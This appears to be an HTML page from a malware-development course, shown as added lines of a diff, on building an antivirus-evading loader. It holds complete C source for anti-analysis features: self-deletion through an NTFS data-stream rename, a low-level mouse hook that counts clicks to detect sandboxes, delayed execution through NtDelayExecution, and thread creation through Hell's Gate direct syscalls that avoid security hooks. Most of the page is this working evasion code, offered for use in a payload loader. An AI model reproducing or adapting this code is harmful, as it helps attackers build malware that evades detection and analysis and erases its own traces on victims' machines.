+        </div><h3 id="loader-results" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Loader Results</span></h3><h3 id="remote-code-injection" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Remote Code Injection</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-216782299-f2e9c796-2d79-42e9-b69d-6e4277f531f4.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong><strong>Local Code Injection</strong></strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-416782441-c87f902c-af70-4657-ad39-93d2f977673b.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="anti-analysis-features" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Anti-Analysis Features</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To add anti-analysis features create a new file called <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AntiAnalysis.c</code>. This file will contain the following functionality:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Self-deletion function from the <em>Anti-Debugging - Self-Deletion</em> module.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Mouse clicks monitoring feature from the <em>Anti-Virtual Environments - Multiple Techniques</em> module</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>A function to delay execution using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtDelayExecution</code> from the <em>Anti-Virtual Environments - Multiple Delay Execution Techniques</em> module</span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>AntiAnalysis.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &quot;Structs.h&quot;#include &quot;Common.h&quot;// Global hook handle variable
+HHOOK g_hMouseHook = NULL;
+// global mouse clicks counter
+DWORD g_dwMouseClicks = NULL;
+
+
+
+// The callback function that will be executed whenever the user clicked a mouse button
+LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {
+
+    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
+        printf(&quot;[+] Mouse Click Recorded \n&quot;);
+        g_dwMouseClicks++;
+    }
+
+    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
+}
+
+
+
+BOOL MouseClicksLogger() {
+
+    MSG 	Msg = { 0 };
+
+    // Installing hook
+    g_hMouseHook = SetWindowsHookExW(
+        WH_MOUSE_LL,
+        (HOOKPROC)HookEvent,
+        NULL,
+        NULL
+    );
+    if (!g_hMouseHook) {
+        printf(&quot;[!] SetWindowsHookExW Failed With Error : %d \n&quot;, GetLastError());
+    }
+
+    // Process unhandled events
+    while (GetMessageW(&amp;Msg, NULL, NULL, NULL)) {
+        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
+    }
+
+    return TRUE;
+}
+
+
+BOOL DeleteSelf() {
+
+
+	WCHAR				    szPath[MAX_PATH * 2] 	    = { 0 };
+	FILE_DISPOSITION_INFO	Delete 			    	    = { 0 };
+	HANDLE				    hFile 			    	    = INVALID_HANDLE_VALUE;
+	PFILE_RENAME_INFO		pRename 		    	    = NULL;
+	const wchar_t* 			NewStream 		    	    = (const wchar_t*)NEW_STREAM;
+	SIZE_T				    sRename 		    	    = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);
+
+	// Allocating enough buffer for the &#x27;FILE_RENAME_INFO&#x27; structure
+	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
+	if (!pRename) {
+		printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	// Cleaning up the structures
+	ZeroMemory(szPath, sizeof(szPath));
+	ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));
+
+	//--------------------------------------------------------------------------------------------------------------------------
+	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call)
+	Delete.DeleteFile = TRUE;
+
+	// Setting the new data stream name buffer and size in the &#x27;FILE_RENAME_INFO&#x27; structure
+	pRename-&gt;FileNameLength = sizeof(NewStream);
+	RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));
+
+	//--------------------------------------------------------------------------------------------------------------------------
+
+	// Used to get the current file name
+	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
+		printf(&quot;[!] GetModuleFileNameW Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	//--------------------------------------------------------------------------------------------------------------------------
+	// RENAMING
+
+	// Opening a handle to the current file
+	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		printf(&quot;[!] CreateFileW [R] Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	wprintf(L&quot;[i] Renaming :$DATA to %s  ...&quot;, NEW_STREAM);
+
+	// Renaming the data stream
+	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
+		printf(&quot;[!] SetFileInformationByHandle [R] Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	wprintf(L&quot;[+] DONE \n&quot;);
+
+	CloseHandle(hFile);
+
+	//--------------------------------------------------------------------------------------------------------------------------
+	// DELEING
+
+	// Opening a new handle to the current file
+	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE &amp;&amp; GetLastError() == ERROR_FILE_NOT_FOUND) {
+		// in case the file is already deleted
+		return TRUE;
+	}
+	if (hFile == INVALID_HANDLE_VALUE) {
+		printf(&quot;[!] CreateFileW [D] Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	wprintf(L&quot;[i] DELETING ...&quot;);
+
+	// Marking for deletion after the file&#x27;s handle is closed
+	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &amp;Delete, sizeof(Delete))) {
+		printf(&quot;[!] SetFileInformationByHandle [D] Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	wprintf(L&quot;[+] DONE \n&quot;);
+
+	CloseHandle(hFile);
+
+	//--------------------------------------------------------------------------------------------------------------------------
+
+	// Freeing the allocated buffer
+	HeapFree(GetProcessHeap(), 0, pRename);
+
+	return TRUE;
+}
+
+
+
+typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
+	BOOLEAN              Alertable,
+	PLARGE_INTEGER       DelayInterval
+	);
+
+BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
+
+	// Converting minutes to milliseconds
+	DWORD                   dwMilliSeconds         = ftMinutes * 60000;
+	LARGE_INTEGER           DelayInterval          = { 0 };
+	LONGLONG                Delay                  = NULL;
+	NTSTATUS                STATUS                 = NULL;
+	fnNtDelayExecution      pNtDelayExecution      = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtDelayExecution&quot;);
+	DWORD                   _T0                    = NULL,
+	                        _T1                    = NULL;
+
+	printf(&quot;[i] Delaying Execution Using \&quot;NtDelayExecution\&quot; For %0.3d Seconds&quot;, (dwMilliSeconds / 1000));
+
+	// Converting from milliseconds to the 100-nanosecond - negative time interval
+	Delay = dwMilliSeconds * 10000;
+	DelayInterval.QuadPart = -Delay;
+
+	_T0 = GetTickCount64();
+
+	// Sleeping for &#x27;dwMilliSeconds&#x27; ms
+	if ((STATUS = pNtDelayExecution(FALSE, &amp;DelayInterval)) != 0x00 &amp;&amp; STATUS != STATUS_TIMEOUT) {
+		printf(&quot;[!] NtDelayExecution Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		return FALSE;
+	}
+
+	_T1 = GetTickCount64();
+
+	// Slept for at least &#x27;dwMilliSeconds&#x27; ms, then &#x27;DelayExecutionVia_NtDE&#x27; succeeded, otherwize it failed
+	if ((DWORD)(_T1 - _T0) &lt; dwMilliSeconds)
+		return FALSE;
+
+	printf(&quot;\n\t&gt;&gt; _T1 - _T0 = %d \n&quot;, (DWORD)(_T1 - _T0));
+
+	printf(&quot;[+] DONE \n&quot;);
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="antianalysis-helper-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>AntiAnalysis Helper Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Create a new function, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AntiAnalysis</code>, to efficiently call the above functions. To use the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AntiAnalysis</code> function, an external variable, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_Sys</code>, is required. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_Sys</code> is a <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VX_TABLE</code> structure that contains the data necessary to use syscalls in the program.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Brief points about the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AntiAnalysis</code> function:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>It takes <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">dwMilliSeconds</code> as an input parameter which represents the amount of time to monitor for mouse clicks.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>This function begins by calling <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">DeleteSelf</code> to delete the file from the disk.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>A while loop is then initiated, which runs the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">MouseClicksLogger</code> through a new thread and waits for it for a period specified by <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">dwMilliSeconds</code>.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Once the thread time is up, the hooks installed will be removed and the execution of the program will be delayed for half the value of the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">i</code> variable; where <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">i</code> represent the value to delay execution for in minutes.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>The function then checks the total number of mouse clicks before the delay. If it is less than 5, the global mouse click monitor variable, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_dwMouseClicks</code>, is reset so the next loop will start the mouse click test from the beginning.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Incrementing the variable <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">i</code> forces the subsequent <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">DelayExecutionVia_NtDE</code> function to wait for a longer duration, creating a way of delaying execution in a sandbox.</span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>AntiAnalysis.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">// using the &#x27;extern&#x27; keyword, because this variable is already defined in the &#x27;Inject.c&#x27; file
+extern VX_TABLE g_Sys;
+
+//...
+
+BOOL AntiAnalysis(DWORD dwMilliSeconds) {
+
+	HANDLE					hThread			= NULL;
+	NTSTATUS				STATUS			= NULL;
+	LARGE_INTEGER			DelayInterval	= { 0 };
+	FLOAT					i			    = 1;
+	LONGLONG				Delay			= NULL;
+
+	Delay = dwMilliSeconds * 10000;
+	DelayInterval.QuadPart = -Delay;
+
+	// Self-deletion
+	if (!DeleteSelf()) {
+		// we dont care for the result - but you can change this if you want
+	}
+
+	// Try 10 times, after that return FALSE
+	while (i &lt;= 10) {
+
+
+		printf(&quot;[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n&quot;, (dwMilliSeconds / 1000));
+
+		// Creating a thread that runs &#x27;MouseClicksLogger&#x27; function
+		HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
+		if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
+			printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+			return FALSE;
+		}
+
+		// Waiting for the thread for &#x27;dwMilliSeconds&#x27;
+		HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
+		if ((STATUS = HellDescent(hThread, FALSE, &amp;DelayInterval)) != 0 &amp;&amp; STATUS != STATUS_TIMEOUT) {
+			printf(&quot;[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n&quot;, STATUS);
+			return FALSE;
+		}
+
+		HellsGate(g_Sys.NtClose.wSystemCall);
+		if ((STATUS = HellDescent(hThread)) != 0) {
+			printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
+			return FALSE;
+		}
+
+		// Unhooking
+		if (g_hMouseHook &amp;&amp; !UnhookWindowsHookEx(g_hMouseHook)) {
+			printf(&quot;[!] UnhookWindowsHookEx Failed With Error : %d \n&quot;, GetLastError());
+			return FALSE;
+		}
+
+		// Delaying execution for specific amount of time
+		if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
+			return FALSE;
+
+		// If the user clicked more than 5 times, we return true
+		if (g_dwMouseClicks &gt; 5)
+			return TRUE;
+
+		// If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
+		g_dwMouseClicks = NULL;
+
+		// Increment &#x27;i&#x27;, so that next time &#x27;DelayExecutionVia_NtDE&#x27; will wait longer
+		i++;
+	}
+
+	return FALSE;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Common.h</code> must be updated to include the prototype for <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AntiAnalysis</code> as well as defining <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NEW_STREAM</code> which is required by the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">DeleteSelf</code> function.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Common.h</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">// The new data stream name
+#define NEW_STREAM L&quot;:Maldev&quot;
+
+BOOL AntiAnalysis(DWORD dwMilliSeconds);</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The anti-analysis features can be enabled by calling the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AntiAnalysis</code> function in <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">main.c</code>, however, this must be done after the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeSyscalls</code> function has been called as the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AntiAnalysis</code> function utilizes direct syscalls which are only available after this function has been executed. For testing, the following if-statement is added to the main function in <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">main.c</code>.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Main.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">if (!AntiAnalysis(20000)) {
+	printf(&quot;[!] Detected A Virtualized Environment \n&quot;);
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Where <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">20000</code> represents the time to monitor the mouse clicks in milliseconds.</p><h3 id="ntdelayexecution-via-hell-s-gate" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>NtDelayExecution Via Hell's Gate</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Hell&#x27;s Gate can be used to call <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtDelayExecution</code>, which requires updating the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VX_TABLE</code> structure definition located in <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Common.h</code> and the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeSyscalls</code> function to add the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VX_TABLE_ENTRY NtDelayExecution</code> element and initialize it. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Hasher</code> program will also need to be used to calculate the hash for the syscall, as was done in previous steps.</p><h3 id="anti-analysis-results" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Anti-Analysis Results</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The following image shows the output of the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">AntiAnalysis</code> function at runtime.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
